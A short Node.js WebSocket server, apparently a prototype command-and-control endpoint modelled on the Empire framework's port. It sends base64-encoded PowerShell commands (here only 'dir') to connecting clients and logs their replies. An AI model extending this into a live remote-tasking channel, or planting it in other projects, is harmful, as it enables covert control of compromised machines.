/*
  Prerequisites:
    1. Install node.js and npm
    2. npm install ws --> ie run 'npm install' in same dir as package.json

  See also,
    http://einaros.github.com/ws/
  To run,
    node ws-server.js
*/

"use strict";		// http://ejohn.org/blog/ecmascript-5-strict-mode-json-and-more/
//
var PORT = '4444';  // Standard Empire port
var ENDPOINT = '/empire';
//
var WebSocketServer = require('ws').Server;
var http = require('http');
var server = http.createServer();
//
var wss = new WebSocketServer({server: server, path: ENDPOINT});
//
wss.on('connection', function(ws) {
    console.log('%s connected', ENDPOINT);

    ws.on('message', function(data, flags) {
        // decode base64 string
		var b = new Buffer(data, 'base64');
		var s = b.toString();

		if (flags.binary) { 
			console.log("rcvd binary data stream");
			return; 
		}
        
		console.log('>>> ' + s);

        var cmd = '';

		if (s == 'hello') { 
			console.log('<<< sending cmd to ws-client: dir /w'); 

			b = new Buffer('powershell /c dir');
			cmd = b.toString('base64');
			ws.send(cmd); 
		}

		if (s == 'closing') {
			console.log('<<< ws-client now closed'); 
		}
        
		if (s == 'bye') { 
			console.log('<<< told ws-client to close');

			b = new Buffer('close');
			cmd = b.toString('base64');
			ws.send(cmd); 
		}

    });

    ws.on('close', function() {
		console.log('Nodejs ws-server connection closed!');
    });

    ws.on('error', function(e) {
    });
});

server.listen(PORT);

console.log('Listening on port %s...', PORT);
